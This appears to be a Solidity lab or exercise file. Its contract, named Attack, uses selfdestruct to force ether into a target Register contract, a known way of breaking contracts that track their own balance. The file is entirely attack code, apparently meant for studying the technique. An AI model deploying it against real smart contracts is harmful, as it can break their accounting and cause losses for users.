// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
import "./Register.sol";

contract Attack {
   Register registerAddress;
 
   constructor(Register _registerAddress) {
       registerAddress = Register(_registerAddress);
   }
 
   receive() external payable {}
    
   function attack() public payable {
       address payable addr = payable(address(registerAddress));
       selfdestruct(addr);
   }
}